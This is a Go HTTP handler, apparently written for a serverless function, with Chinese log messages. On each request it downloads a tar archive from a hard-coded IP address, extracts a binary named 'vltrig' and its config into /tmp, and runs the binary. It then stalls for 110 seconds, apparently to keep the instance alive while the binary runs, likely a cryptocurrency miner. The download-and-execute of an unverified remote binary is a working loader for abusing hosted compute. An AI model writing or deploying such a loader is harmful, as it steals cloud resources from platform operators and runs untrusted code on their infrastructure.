package handler

import (
	"archive/tar"
	"encoding/json"
	"errors"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

var (
	mu        sync.Mutex
	isRunning bool
)

func Handler(w http.ResponseWriter, r *http.Request) {
	log.Println("[INFO] --- 收到新请求 ---")
	binPath := "/tmp/vltrig"
	configPath := "/tmp/config.json"

	// 1. 容器复用检测（检查二进制文件是否存在）
	if _, err := os.Stat(binPath); os.IsNotExist(err) {
		log.Println("[INFO] 未检测到可执行文件，开始下载并解压...")
		if err := downloadAndExtract(binPath, configPath); err != nil {
			log.Printf("[ERROR] 下载或解压失败: %v\n", err)
			http.Error(w, "下载或解压失败: "+err.Error(), http.StatusInternalServerError)
			return
		}
		log.Println("[INFO] 下载解压完成，开始对二进制文件赋权...")
		if err := os.Chmod(binPath, 0755); err != nil {
			log.Printf("[ERROR] 赋权失败: %v\n", err)
			http.Error(w, "赋权执行权限失败: "+err.Error(), http.StatusInternalServerError)
			return
		}
		log.Println("[INFO] 赋权成功: 0755")
	} else {
		log.Println("[INFO] 检测到文件已存在，跳过下载环节。")
	}

	// 2. 进程状态检测与启动
	mu.Lock()
	if !isRunning {
		log.Println("[INFO] 程序未运行，准备启动 vltrig...")
		
		// 【修改点 2 & 3】：带上配置文件参数，并指定工作目录
		cmd := exec.Command(binPath, "-c", configPath)
		cmd.Dir = "/tmp" // 指定运行目录为 /tmp，防止程序在只读区写日志报错
		
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		if err := cmd.Start(); err != nil {
			mu.Unlock()
			log.Printf("[ERROR] 启动二进制程序失败: %v\n", err)
			http.Error(w, "启动程序失败: "+err.Error(), http.StatusInternalServerError)
			return
		}
		
		isRunning = true
		log.Printf("[INFO] vltrig 启动成功，PID: %d\n", cmd.Process.Pid)
		
		// 监控协程
		go func(c *exec.Cmd) {
			err := c.Wait()
			mu.Lock()
			isRunning = false
			mu.Unlock()
			if err != nil {
				log.Printf("[WARN] vltrig 进程退出，伴随错误: %v\n", err)
			} else {
				log.Println("[INFO] vltrig 进程正常执行完毕退出。")
			}
		}(cmd)
	} else {
		log.Println("[INFO] 程序已在运行中，跳过启动环节。")
	}
	mu.Unlock()

	// 3. 挂起等待
	log.Println("[INFO] 开始挂起等待，预计 110 秒...")
	for i := 1; i <= 11; i++ {
		time.Sleep(10 * time.Second)
		log.Printf("[INFO] 已挂起等待 %d0 秒...", i)
	}

	// 4. 响应成功
	log.Println("[INFO] 110秒等待完成，准备返回响应。")
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "success",
		"message": "接口已成功挂起 110 秒，程序状态检查完成",
	})
}

// 【修改点 1】：解压逻辑支持同时提取多个文件
func downloadAndExtract(binDest, configDest string) error {
	client := &http.Client{
		Timeout: 20 * time.Second, // 放宽一点超时时间以防网络抖动
	}

	log.Println("[INFO] 发起 HTTP GET 请求: http://94.131.19.66/vltrig.tar")
	resp, err := client.Get("http://94.131.19.66/vltrig.tar")
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return errors.New("HTTP状态码非200: " + resp.Status)
	}

	log.Println("[INFO] 开始流式解压 tar 包...")
	tr := tar.NewReader(resp.Body)
	
	foundBin := false
	foundConfig := false

	// 遍历整个 tar 包
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break // 读完整个压缩包
		}
		if err != nil {
			return errors.New("读取 tar 包失败: " + err.Error())
		}

		// 匹配并提取 vltrig
		if hdr.Name == "vltrig" || strings.HasSuffix(hdr.Name, "/vltrig") {
			log.Println("[INFO] 发现 vltrig，准备写入...")
			if err := writeFileFromTar(binDest, tr); err != nil {
				return errors.New("写入 vltrig 失败: " + err.Error())
			}
			foundBin = true
		}

		// 匹配并提取 config.json
		if hdr.Name == "config.json" || strings.HasSuffix(hdr.Name, "/config.json") {
			log.Println("[INFO] 发现 config.json，准备写入...")
			if err := writeFileFromTar(configDest, tr); err != nil {
				return errors.New("写入 config.json 失败: " + err.Error())
			}
			foundConfig = true
		}
	}

	if !foundBin {
		return errors.New("解压失败: 未在 tar 包中找到 vltrig 程序")
	}
	if !foundConfig {
		log.Println("[WARN] 未在 tar 包中找到 config.json，程序可能会启动失败！")
	} else {
		log.Println("[INFO] 二进制文件和配置文件全部提取成功。")
	}

	return nil
}

// 辅助函数：将 tar 中的文件流写入到指定路径
func writeFileFromTar(destPath string, tr io.Reader) error {
	outFile, err := os.OpenFile(destPath, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0755)
	if err != nil {
		return err
	}
	defer outFile.Close()
	
	_, err = io.Copy(outFile, tr)
	return err
}